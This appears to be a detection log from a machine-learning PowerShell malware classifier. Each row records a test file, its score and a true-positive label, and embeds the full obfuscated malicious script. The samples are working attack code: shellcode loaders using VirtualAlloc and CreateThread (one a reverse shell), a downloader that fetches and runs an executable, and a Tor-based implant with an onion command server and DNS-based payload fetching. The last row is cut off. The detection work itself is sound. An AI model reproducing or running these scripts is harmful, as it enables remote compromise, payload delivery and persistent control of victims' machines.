2026-07-13 16:53:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2019.ps1,custom-ps-ml,UNKNOWN,37abf15e-2d78-4371-a214-164e2066b4a7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1555,1604.7," ((\""{8}{31}{32}{33}{12}{14}{25}{26}{29}{23}{6}{1}{17}{5}{15}{28}{27}{24}{4}{20}{34}{0}{9}{19}{10}{18}{11}{35}{30}{2}{7}{21}{13}{3}{22}{16}\""-f 'UXcJvNwPhx+Xk0WnC','sJo','/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA','pressionMode]::Decompress)), [Text.Encoding]:','NnaEAKVLyGYYs4Z+BZ3a','SGU59','cCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQC','6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11','Invoke-Expre','Ry4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ','wHs','7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJ','mpression.DeflateStream (','7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMXZOo)))), [IO.Compression.Com','pY4(New-Object IO.MemoryStream (,pY4([Convert]','uS','nd();','7TnzUjJQil4vub6UOZBYAAlEVR','NWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+','/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dX','d6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w','sXCA+VnUVVz+L/L81tIwD',':ASCII)).ReadToE','438+bNzDKuBNN','5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7','::FromBase64String(ZOolVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT','9RByc','eoKP46PODnrQH94hdi','YA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NH','NYD2WJ2qXddSBH/vbMfBhzRNOFi8L','h90NFf5RcY/hdppkWZYlRN+maJ','ssion pY4(New-Object IO.StreamReader (','pY4(Ne','w-Object IO.Co','0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+o','n')).rePlAce(([CHaR]112+[CHaR]89+[CHaR]52),[sTRing][CHaR]36).rePlAce(([CHaR]90+[CHaR]79+[CHaR]111),[sTRing][CHaR]39)| IeX",malicious,TP
2026-07-13 16:54:18,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2022.ps1,custom-ps-ml,UNKNOWN,ae369f83-f5f6-4f06-b1c8-e1d69e65a127,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,3076,1521.08," &amp; ( $eNv:coMSPec[4,15,25]-jOIn'') ( (((\""{52}{23}{46}{11}{0}{71}{47}{28}{57}{39}{22}{24}{40}{49}{17}{14}{63}{62}{48}{37}{9}{8}{66}{10}{45}{29}{20}{1}{13}{44}{72}{50}{41}{68}{58}{43}{15}{38}{32}{3}{54}{64}{2}{19}{16}{60}{61}{59}{55}{18}{25}{4}{36}{6}{53}{5}{33}{34}{30}{65}{7}{69}{35}{70}{51}{56}{26}{27}{42}{21}{67}{12}{31}\""-f'tern IntPtr VirtualAlloc(I','e,0x92,0x39,0xab,0xfe','0x3a,0x3b,0x8b,0xfb,0x43,0x5b,0x74,0xa3,0xe1,0x17,','0xed,0xf4,0x34,0xbe,0x64,0x4e,0x1','0x8a,0x90,0xb6,0x57,0x8e','0x45,0x8d,0x28,0xdf,0x35,0x6d,0x99,0xb7,0x5f,0x62,0xc6,0xa7,0x5f','2,0x92,0x2f','d,0x71,0x48,0x35,0xe8,0xb5,0xd7,0xc6,0xdf,','0xb7,0x75,0x01,0xf3,0','0x31,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x03,0xb1,0x8a,0xf8,0xe3,','xd6,0xbc,0x4c,0x4c,0xd9,0x3','ublic static ex','ength-1);9csi++) {9csw::memset([IntPtr](9csPnSG.ToI',',0x97,0x74,0x70,0x74','[]];[Byte[]]9csz = 0xdb,0xd','d7,0x11,0x30,0x5e,0x4f,0xfe,0xc1,0xb3,0x16,0x75,0xcd,0x78,0x5c,0xd1,0xd1,',',0x36,0xb',' Add-Type -memberDefinition 9csBsT2 -Name UrnWin32Urn -namespace Win32Functions -passthru;[Byte',',0x46,0xda,0xd1,0x4a,0x6f,0x63,0x','0x98,0xb0,0x9b,0x75,0xf4,0x75,0x96,0x85,0x04,0x12,0xa1,0xf6','xf4,0xc','0;9csi -le (','Urn)]','DllI','public static extern IntPtr ','ba,','000;if (9csz.Length',' -gt 0x10','l32.dllUrn)]public static extern IntPtr CreateThread(IntPtr lpThreadAttribu','x2d,0',',0x44,0x0d,0x00,0x36,0x13,0x6f,0x','nt32()+9csi), 9csz[9csi], 1)};9csw::CreateThread(0,0,9csPnSG,0,0,0);for (;;){Start-sleep 60};',',0x69,',',0xa8,0x6f,0x4d,0xb0,0x05,0xc7,0xf9,0x29,0x0c,0x93',',0x98,0xb6,0x9a,0xd9,0x9a,0x3d,0x29,0x1d,0x54,0xb6','xb3,0x20,0x38,0x49,0xd9,0x20,0x50,0x2d,0xb9,0x72,0x45,0x32,0x14,0xe7,0xd6,0xa7,0x97,',',0x06,0xf9,0x00,0x91,0xb2,0x91,0x5','0xf4,0x5d,','0x7f,0xb1','hreadId);[DllImport(Urnmsvcrt.dll','memset(IntPtr dest, uint src','b9','00){9csg = 9csz.Length};9csPnSG=9csw::VirtualAlloc(0,0x1000,9csg,0x40);for (9csi=','0x94,0x',',0xeb,0x99,0xf0,0x69,0xbb,0x9','d,0xfc,0xac,0x78,0xbd,0xff,0xe0,0x5a,0xfc,0xcf,0xf4,0x9b,0x39,0','mport(Urnkernel32.dllUrn)]p','AllocationType, uint flProtect);[DllImport(Urnkerne','4,',', uint count);UHv;9csw =','f1,0xbe,0x15,0x7f,0xb8,0xd8,0x7a,0xba,0x72,0x52,0x48,0x30,0x85,0xb2,0x81,0x','7,0x5f,0x9e,0xd1,0x59,0xa3','9csBsT2 = UHv[',',0xd1,0xda,0x74,0x1f,','3,0x1a,0x','d0',',0x49,0x1f,0x2c,0xcd,0x49;9csg = 0x1','tes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpT','b,0x2e,0x48,0x32,0x3b,0x88,0xb3,0x41,0x35,0xeb,0x4e,0x52,0x82,0x96,','66,0x7d,0x6d,0x70,0xf8,0x80,0x8e,0x81,0x','d,0x19,0x91,0x7a,0x3','6,0x84,0x','0x2','4,0xb8,0x07,0x53,0x7f,0x04,0xd9,0x74,','2d,0x14,','86,0x49,0x89,0x1a,0x26,0xdc,0x36,0x8','xd7,0xfc,0xe4,0xc2,0xd7,0x9b,0x6d,0x74,0xe8,0xe8,0x20,0x78,0x83,0xbd,0xd0,0x0b,0xe1,0x69,0','9csz.L',',0x2a,0xf','0xce,0xde,0x52,0xa0,0xb8,0x1e,0','0x5e,0x8b,0x60,0xf0,0x5c,0xf2,0x4','ntPtr lpAddress, uint dwSize, uint fl','8,0xd1,0x3f,0xb0,0xc2,0x'))  -crepLACE 'UHv',[cHAR]39-crepLACE ([cHAR]85+[cHAR]114+[cHAR]110),[cHAR]34 -RePlAce([cHAR]57+[cHAR]99+[cHAR]115),[cHAR]36))",malicious,TP
2026-07-13 16:54:33,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2023.ps1,custom-ps-ml,UNKNOWN,0b642098-85fd-400c-8d00-81a9aad1e6fe,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3085,1800.53,"((\""{19}{55}{53}{50}{57}{10}{38}{47}{46}{12}{3}{31}{28}{63}{59}{61}{8}{69}{22}{41}{17}{68}{37}{54}{67}{35}{49}{13}{34}{33}{29}{71}{65}{44}{45}{4}{66}{43}{62}{40}{15}{64}{24}{25}{56}{5}{72}{30}{39}{14}{52}{32}{1}{11}{7}{27}{26}{58}{6}{60}{2}{9}{0}{42}{18}{16}{36}{20}{48}{21}{70}{23}{51}\""-f'2e,0x13,0xea,0x','x34,0x7d,0xfe,0x2b,0x77,0x2a,0x01,0xa0,0x1f,0x29,0x02,0xb7,0x64,0xa4,0xe4,0xe7,0xca,0xe7','xa','wCreationFl','86,0x4e,0x7a,0xf1,0x1a,0xe4,0x30,0x17,0x1b','5,0xd9,0x9f','0xc8,0xa2,0x53,0xc','0x47,0x56,0x4f,0xda,0x8d,0xff,0xe5,0x35,0x78,0x57,0x91,0xac,0x21,0x23,0x00,0x30,0xfc,0x4','nt src, uint count);xGM;6yzw','c,0x49,0x77,0xbe,0x38,0x72,0x','lpAddress, uint d',',0xb8,0x47,0xbb,0x47,0x69,0x2f,0xd1,','nt d','xb5,0xb0,0x45','58,0x0c,0xfa,0','e,0x0c,0xab,0xbd,0x31,0x7b,0xc5,0xbe,0xcc,0','.Length -gt 0x1000){6yzg = 6yzz.Length};6yz5Lb=6yzw::VirtualAlloc(0,0x1000,6yzg,0x40);for (6yzi=','0x59,0x74,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x72,0x18,','xb9,0xdc,0xf9,0xf9,0x87,0xaa,0x13,0x3a;6yzg = 0x1000;if (6yzz','6yzja1 = x','zi++) {6yzw::mem','), 6yzz[6yzi], 1)};6yzw::CreateThread(','-Type -memberDefinition 6yzja1 -Name gJ3Win32gJ3 -name','5Lb,0,0,0);for (;;){Start-sl',',0x81,0x65,0xd8,0xaa,0x6d,0x94,0x0d,0x2c,0xe5,0x9a,0xfa',',0x3a,0','e2,0x8a,0x8e,0x51,0x09,0x1d,0xd9,0xcd,0x13,0x78,0x2d,0x52,0xeb,0xa','9,0x02,0xba,0xf3,0xae,0xcc,0x4b,0x79,0xbd,0xb8,0xbb,0x34,0x9f,0x6e,0xc3,0x','eadId);[DllImport(gJ3msvcrt','63,0x34,0x46,0x57,0xc9,0x62,0x69,','6,0xeb,0x00,0x7c,0x0','ags, IntPtr lpThr',',0xbb,0','0x9b,0x20,0xde,0x',',0x0d,','4','0;6yzi -le (6yzz.Length-1);6y',',0x04,0x03,0x72,0xd8,0x32,0xac,','wSize, uint flAllocationType, uint flProtect);[DllImport(gJ3kernel32.dllgJ3)]public static extern IntPtr CreateThr','1,0x47,0xc8,0x5a,0xd6,0xa8,0xe3,0x1b,0x48,0x57,0x0c,0x5c,0x40,0x93,0x','6b,0x79,0xc','space Win32Functions -passthru;[Byte[]];[Byte[]]6yzz = 0xd9,0xca,0xbe,0xcc,0xd0,','1a,0xcc,0x4a,0xdc,0x84,0x2f,0','0xc4,0x5c,0xc2,0x65,0xb2,0','8b,0xca,0xd3,0xb1,0xde',',0x0b,0x14,0xaf,0x13,0x59,0xcd,0xbb,0x','eadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ui','ead(IntPtr lpThr','set([IntPtr](6yz5Lb.ToInt32()+6yzi',',0xf9,0x55,0xbd,0xdd,0xa9,0x65,0','tern IntPtr VirtualAl','eep 60};','x32,0xe1,0xc7,0xfa','static ex','0x88,0','GM[DllImport(gJ3kernel32.dllgJ3)]public ','xa1,0xbe,0xfd,0xef,0xd9,0xba,0x76,0x0e,0x0e,0x4b,0xcc,0x35,0x8a,0x10,0x96,0x54,0x8b,0xfc,0x79,0x68,0xcb,0x5f,0x25,0xcc,0x87,0x4d,0x32,0x7d,0xca,0x19,0xf7,0x4c,0xf','loc(IntPtr ','f,0x26,0x5b,0x79,0x10,0x50,0xa4,0x6d,0x90,0xa0,0xf2,0xe7,0x90,',' extern I','3,0xed,0','ntPtr memset(IntPtr dest, ui','x5e,0x02,0xb4,0x3b,0xcc,0x','.dllgJ3)]public static','x7c,0x12,0xbd,0x0a,0x08','x79,0x',',0x19,0x80,0x16,0x0a,0x8c,0x9b,0x40,0x8c,0x2e,0x48,0xf9,0x85,0x28,0x8d,','x08,0x30,0x4f,0x71,0xc8,0x55,0xd9,0x9','0x83,0xc2',' = Add','0,0,6yz','0x68,0x62,0x56,0xe8,0xea,0',',0xc7,0x8')).replace('gJ3',[stRiNg][ChAr]34).replace(([ChAr]54+[ChAr]121+[ChAr]122),'$').replace(([ChAr]120+[ChAr]71+[ChAr]77),[stRiNg][ChAr]39)| &amp; ((vARiAble '*mDR*').name[3,11,2]-joIn'')",malicious,TP
2026-07-13 16:54:38,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2028.ps1,custom-ps-ml,UNKNOWN,13d7ab3b-60b9-4eb9-93de-d1978fcce4cd,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2765,1972.11," (((\""{38}{11}{15}{34}{5}{30}{33}{28}{21}{18}{45}{19}{27}{14}{12}{10}{35}{25}{23}{36}{24}{2}{17}{44}{40}{43}{31}{6}{0}{22}{29}{26}{39}{9}{20}{32}{7}{3}{42}{37}{8}{13}{1}{46}{16}{4}{41}\"" -f'0,0x40,0x5',');for (jQFi=0;jQFi -le (jQFz.Length-1);jQFi++) {','d3,0xe3,0x3c,0x49,0','8,0x','d(0,0,jQFx,0,0,0);for (;;){Sta','ype, uint flProtect);[DllIm','9,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x5','68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x6','0x1000;if (jQFz.Length -gt 0x1000){jQFg = jQFz.Length};jQFx=jQFw::VirtualAlloc(0,0x1000,jQFg',',0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00','c,0x02,0x',' static e',',0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7',',0x40','8b,0x52,0x14,0x8b,0x72,0x28,0x0f','xtern I','Ptr](jQFx.ToInt32()+jQFi), jQFz[jQFi], 1)};jQFw::CreateThrea','x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,','hreadAttributes, uint dwStackSize, IntPtr lpStartAddress',',0x00,0x00,0x60,0x89,',',0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0',' extern IntPtr CreateThread(IntPtr lpT','0,0x68,0','0x52,0x57,','b,0x48,0x18,0x8b,0x58,0x20,0x01,0x','0x01,0xc7,0xe2,0xf0,','8,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,','0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x','lic static','xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc8,0x0a,0x6','p','0xd5,0xb8,0x90,0x01,0x00,0x00,0x2','xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x','ort(rpZkernel32.dllrpZ)]pub','ntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationT','2c,0x20,0xc1,0xcf,0x0d,','0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8','0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;jQFg = ','jQFc = EUT[DllImport(rpZkernel32.dllrpZ)]public','0x08,0x75','8,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x','rt-sleep 60};','58,0xa4,0x53,0xe5,','44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,','0x0c,0x4b,0x8b,0x5',', IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(rpZmsvcrt.dllrpZ)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);EUT;jQFw = Add-Type -memberDefinition jQFc -Name rpZWin32rpZ -namespace Win32Functions -passthru;[Byte[]];[Byte[]]jQFz = 0xfc,0xe8,0x89,0x00','jQFw::memset([Int')) -creplaCe([Char]69+[Char]85+[Char]84),[Char]39-Replace'jQF',[Char]36 -Replace  ([Char]114+[Char]112+[Char]90),[Char]34) |inVOkE-EXPREssioN",malicious,TP
2026-07-13 16:54:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2047.ps1,custom-ps-ml,UNKNOWN,56be0917-62a6-4f8b-baef-9c5edfdf02cc,DESKTOP-BAC9DBQ,malicious,0.9347,RandomForest,734,1670.45,". ((get-VARIABlE '*MDr*').name[3,11,2]-JoIn'') ((((\""{33}{26}{32}{6}{31}{25}{41}{48}{45}{1}{4}{23}{3}{7}{13}{39}{9}{30}{29}{21}{47}{36}{37}{20}{15}{10}{24}{38}{27}{17}{19}{40}{12}{11}{34}{14}{8}{18}{16}{2}{46}{35}{44}{42}{28}{5}{43}{0}{22}\""-f'xe','(TyYht','Z','g','t','mt.','stem.N','etl','rt-','ceders.honor',',lZ3','e','mt.','o','Sta','xeTyY','ess (l','T','Proc','EMPv','.e','/','lZ3)','p://','LBt','Cli','-Object ','nv:','i','es','.','et.Web','Sy','(New','xelZ3);','v','im','t','e','hnum','7mki','ent)','v7mk','e',':TEMP','nloadFile','3LBten','k','.Dow')) -crEpLace ([CHaR]76+[CHaR]66+[CHaR]116),[CHaR]36  -rEplAcE  ([CHaR]108+[CHaR]90+[CHaR]51),[CHaR]34 -crEpLace 'v7m',[CHaR]92-crEpLace  ([CHaR]84+[CHaR]121+[CHaR]89),[CHaR]39))",malicious,TP
2026-07-13 16:54:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\205.ps1,custom-ps-ml,UNKNOWN,4c19115e-0068-4b0b-a0dd-4c423b2b3800,DESKTOP-BAC9DBQ,malicious,0.9571,RandomForest,3700,1511.28,"((\""{76}{83}{63}{24}{46}{51}{59}{40}{54}{84}{25}{44}{67}{32}{8}{81}{33}{21}{47}{31}{62}{29}{52}{53}{58}{16}{71}{2}{43}{74}{22}{86}{85}{72}{34}{36}{7}{10}{14}{49}{80}{1}{20}{9}{75}{35}{26}{39}{13}{28}{12}{27}{0}{18}{77}{79}{57}{64}{37}{30}{55}{38}{6}{70}{61}{60}{17}{82}{73}{3}{56}{23}{42}{4}{15}{5}{41}{69}{66}{78}{50}{11}{19}{45}{68}{65}{48}\""-f'-Pat','svoz;','svoz;vozSHreDrqslGOvoz;vozbmXjlGkPNOWvoz',': ','glocalhost:8123Cjg);vozmjeAqUvoz;voz','7b','-Ar Cjg --Log Xh4Cjgnotice file 7','WRpvoz;vozOmrLJSCcsbvoz;7bMjnj.Attribute',';vozMtqBuvoz;(Get-Proc','i+ voz6Q1polipo.exevoz;vozcCvoz;vozvMtZkvo','s = CjgHiddenCjg, CjgSystemCjg, ','cOvoz;vozYzT','WebClien','z;vozJrixywvoz;7bMb','CjgNotContentInd','HhVzvoz;7bMlf.useDefaultCredentials = 7bMtrue;vozEowjlibIiiyvoz;vozJozvoz;',';vozcmBlkiUWvoz;vozpJsbWflOAQvoz;7bMfjx.NameSpace(7bMzui).CopyHere(7bMfi, 20);vozfLGzWvoz;vozqavoz;rd 7bMai;vozItpKvoz;vozgAcxQok','otstrap','h 7bMszeo)){;vozHkuNDGZjxPNvoz;vozzNObipamCTvoz;e vozi.vankin.devoz;vozlcNRnsrLznGvoz;vozJeIDPkUPcaMvoz;};vozPccwMqmjIrvoz;vozLcj','yALPvoz;while(!7bMcl){7bMcl=7bMbp.d','vozuadZsvoz;7bMfkz=7bMzui+ voz6Q1tor.exevoz;vozctAUSvoz;vozndDdWliZvvoz;7bMszeo=7bMzu','v','FEVSvoz;7bMzui = 7bMenv:APPDATA + voz6Q1voz + 7bMwwo;vozQFYaEb','bMszeo -a CjgsocksParentProxy=localhost:9050Cjg -wi Hidden;vozMMLBvoz;vozPBvoz;sleep 7;vozrmtvoz;vozUGYZoHaPrIDvoz;7bMlf=New-Object System.Net.WebProxy(C','emPro','1Windo','vo','t;vozqgloHvfjvoz;vozkmNWBZwaARvoz;7bMfjx=New-Object -C Shell.Application;vozXYLIkQvoz;vozZOUuvoz;vozYEJFvoz;vozNYCvoz;if (!(Test-Path 7bMfkz) -or !(Test','p=New-Object System.Net.','PRCLIF','Rvoz;vozwWHNryvoz;7bMwc=7bMzui+voz6Q1roaminglogvoz;vozxPQgKvo',';7bMorot = (((iex Cjgnslookup -querytype=txt 7bMqza 8.8.8.8','6Q1Run) -match 7bMwwo){;vozQaVdFFjjvoz',';vozxjpZeYDvvoz;function e(7bMqza){;vozbGaLALnMw','y -','z;','Force -Path 7bMzui;vozWSBNzrQ','st-Path 7bMszeo)){;vozeURPtEdvoz;vozqAoHvoz;e vozgg.ibiz.ccvoz;vozCkjKvoz;vozHrLrvoz;};vozBDovoz;vozdhVYRufOvoz;vozqTt',' 7bMfkz ','zkrKyEjhsvo','KCU:6Q16Q1Software6Q1Micros','Mbp.proxy=7bMlf;voztQmlyxgSqLvoz;vozOPYAuE','j',';vozvL','ws6Q1Curren','ownloadString(7bMoxq)};vozlMBvoz;vozFQQpJnAvoz;if (7','duct).UUID;','oz;vozENxLTKdjvoz','ozJeylefvoz;};vozJiokKKvoz;','exedCjg;vozAVKtvoz;vozXzQSCvoz','setup&amp;uid=voz + 7bMwwo;vozL','vozSaRtvoz;vozElFeXOtQjzvoz;if ((gp ','VQHvoz;vozcVvoz',';7bMfi = 7bMfjx.NameSpace(7bMai','oft6','z;vozaFglvoz;saps','Done.voz));vozJzJtwaoxodvoz;vozfmLibNDQXiTvoz;saps 7','7',').Items()','H','leep 1;7bMll=gc 7bMwc}while(!(7bMll -match vozBo','oz;vozqvkWgQFNvoz;do{s','Cjg) -match vozCjgvoz) -replace vozCjgvoz, vozvoz)[0].Trim();vozZuiAzZTvoz;vozInvoz;7bMbp.DownloadFile(7bMorot, 7bMai);voz','terSyst','bMfkz) -or !(Te','){;vozTKNTovoz;vozINvoz;iex 7bMcl;vozPiMvoz;v','n/get.ph','tVersion','bMcl -ne voznonevoz','pisAzvoz;7bMoxq=vozhttp://powerwormjqj42hu.onio','bMwcXh4CjgCjg -wi Hidden;vozsHv','jbdqvoz;};vozdfbWqLtvoz;vozpyiBJGPr','New-Item -ItemType Director','%','bvoz;voztHZFG','z;7bMai=7bMzui+voz6Q1voz+7bMwwo+voz.zipvo','vozlVBjWWvoz;7bMErrorActionPreference = vozSilentlyContinuevoz;vozjNQOAiMMkdRvoz;vozjmqvoz;7bMwwo = (get-wmiobje','voz;vozRSdcbBdrWvoz;vozKtWZIdMovoz;i','p?s=','f (!(Test-Path ',';};vozcsPpLzvoz;vozGqAvoz;vozXUNcR','ess -id 7bMpid).Kill();vozcwvoz;vozONBGZvoz;};vozXXzyExPxFhYvoz;vozpMdSFKqrvLavoz;vozZbEKbSUhvoz','ped 100','ct Win32_Compu','Q','t-Path 7bMzui)){;vozlasxgvoz;vozWUdKHYvoz;7bMjnj = ','YUvoz;vozVybKxYISVVvoz;if (!(Tes')).REPLace(([Char]118+[Char]111+[Char]122),[STrIng][Char]39).REPLace(([Char]88+[Char]104+[Char]52),'`').REPLace('7bM','$').REPLace('Cjg',[STrIng][Char]34).REPLace('6Q1',[STrIng][Char]92)| &amp;( $PsHOMe[4]+$PsHOME[34]+'X')",malicious,TP
2026-07-13 16:55:06,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2063.ps1,custom-ps-ml,UNKNOWN,7852fdbe-f3b4-497d-9c08-9d054698bcaf,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3868,1507.6," &amp;( $SHellid[1]+$SheLLId[13]+'X') (((\""{36}{30}{60}{40}{48}{23}{11}{47}{59}{12}{64}{26}{21}{14}{19}{32}{58}{43}{31}{45}{8}{10}{3}{20}{42}{22}{35}{29}{61}{15}{37}{50}{9}{51}{41}{53}{33}{38}{44}{52}{18}{39}{6}{55}{49}{13}{2}{16}{46}{7}{34}{25}{65}{1}{24}{62}{27}{63}{54}{28}{56}{57}{4}{0}{5}{17}\"" -f '3gNi=0;3gNi -le (3gNz.Leng',',0xf9,0xf2,0','0x1a,0xfd,0x','xe0,0x4a,0x8','0x1000,3gNg,0x40);for (','th-1);3gNi++) {3gNw::memset([IntPtr](3gNQWjc.ToInt32()+3gNi), 3gNz[3gNi], 1)};3gNw::CreateThread(0,0,3gNQWjc,0,0,0);for (;;){Start-sle','0xf5,0x94,0x32,0x1a,0x6f,0x1a,0xd5,','b,0x1f,0x5f,0x55,0xae,0x20,0xd4,0x7b,0xe8,0x25,0xd5,0xf0,0x1e,0x4c,0xd6,','55,0x74,0x63,0x73,0x','0xb6,0xda,0xc0,0x4b,0x69,0x71,0x97,0x38,0xd9,0xed,0x40,0x36,','ec,0x77,0xb3,0x2c,0x7b,0x3f,0x2b,0x46,0x23,0','ags, IntPtr lpThreadId);[DllImp','memberDefinition 3gN08Q -Nam','19,0x2c,0x92,0x6e,0xc8,','8,0x97,0x02,0xfe,0x68,0xd9,0x74,','c,0x13,0x23,0x50,0x9b,0xe3,0xd3,0xed,0x0a,0x8d,0x4a,0x9b,0x2b,0x05,0xe5,0xd7,0xc4,0x83,0xf2,0x18,0xff,','9c,','ep 60};',',0x74,0xd5,0x6e,0x39,0x','0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x71,0x31,0x43,0x17,0x83,0xeb,0xfc,0x03,0xd4,0x11,0x1c,0x9d,0x26,0xfd,0x69,0x5e,0xd6,0xfe,0x09,0xd6,0x33,0xcf,0x1b,0x8c,0x30,0x62,0xac,0xc6,0x14,0x8f,0x47,0x8a,0x8c,0x04,','b,0x37,0xdc,0x05,0xa0,0x8c,0x96,0x94,0x60,0xdd,0x57,0xa7,0x4c,0xb2,0x69,0x08,0x41,0xca,0xae,0xae,0xba,0xb9,0xc4,0xcd,0x47,0xba,0x1e,0x',' 0xda,0xce,0xb','0xe3,0xab,0x71,0xe4,0xab','eationFl','x40,0xb3,0xd3,0x9','8,0x19,0x57,0x3a,0xc0,0x82,0x58,0x11,0x9f,0xd9,0xa2,0x71,0x6e,0x','amespace Win32Functions -passthru;[Byte[]];[Byte[]]3gNz =',',0x1c,0xb4,','6,0x9c,0x78,0x36,0x00,0xe0,0x90,0x38,0x30,0x1f,0x9f,0xae,0xbf,0xba,0x0d,0x58,0x2b,0x6a,0xbd,0xf1,0xab;3gNg = 0x1000;if (3gNz.Len','x29,0xc0,0xcb,0x0d,0xcc,0x07,0x5a,0x55,0xeb,0x83,0x07,0x0d,0x92,0x92,0xed,0xe0,0xab,0xc5,0x49,0x5c,0x0e,0x8d,0x7b','uint dwSize, uint flAllocationType, uint flProtect);[DllImport','0x88,0x77,0x55,0x34,0xc9,0xb0,0x8b,0xb7,0x9b,0x69,0xc0,0x6','0x25','0x6','0xac,0x4e,0x1d,0x92,0x68,0x62,0x4d,0x4',',0xaf,0x84,0','3gN08Q = oWq[DllImport(5Ipkernel32.dll5Ip)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ','0xfa,0x03,0xb1,0x57,0xab,0xac,0x68,0x30,0x69,0x05','1,0xed,0xa0,0x27,0x49,0x0e,0x9f,0xbe,0x6b,0x9a,0x30,0x9b,0x1b,0xdb,0x02,0x1b,0x','ff,0xf8,0x3b,0xb6,0x84,0x8e,0xbc,0xc8,0x84,0x7b,0x6d,0x21,0x1c,0x7b,0x8e,0xb1,0xf5,0xd0,0x71,0x4e,0xfa,0x06,0xe3,0xdf,0x61,0x2c,0x97,0x7a,0x19,0xe1,0x14,0xf2,0xb4,0x8e,','hread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParam','37,0x2f,0xb1,0x56','ac,0x93,0x4f,0x83,0x16,0x57,0xf7,0x67,0xa7,0xb4,0x6e,','xad,0x80,0x75,0x8a,0x2e,0x25,0xba,0x40,0xec,0x27,0x46,0x9a,0x21,','dc,0x52,0x84,0x71,0xd8,0x34,0x2f,0x9a,0xb6,0xdc,0xda,0x','a,0x0c,0x1d,0x94,0xb6,0x2d,0xf1,0x93,0x87,0x','0x7c,0x2','ort(5Ipmsvcrt.dll5Ip)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);oWq;3gNw = Add-','eter, uint 